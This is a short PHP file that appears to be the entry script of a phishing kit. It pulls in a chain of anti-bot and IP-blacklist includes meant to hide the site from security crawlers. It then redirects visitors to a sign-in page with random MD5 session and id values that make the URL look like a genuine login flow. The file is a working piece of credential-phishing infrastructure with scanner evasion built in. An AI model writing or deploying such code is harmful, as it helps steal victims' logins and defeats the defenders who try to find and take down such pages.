<?php
	
	
ob_start();
session_start();

include'blocker.php';  
include'BOTS/index.php';  
include'BOTS/IP-BlackList.php';  
include'BOTS/Bot-Crawler.php';
include'BOTS/Bot-Spox.php';
include'BOTS/blacklist.php';
include'BOTS/new.php';
include'BOTS/Fuck-you.php'; 
include'BOTS/Dila_DZ.php';

$praga=rand();
	$praga=md5($praga);

	header("location: signin.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>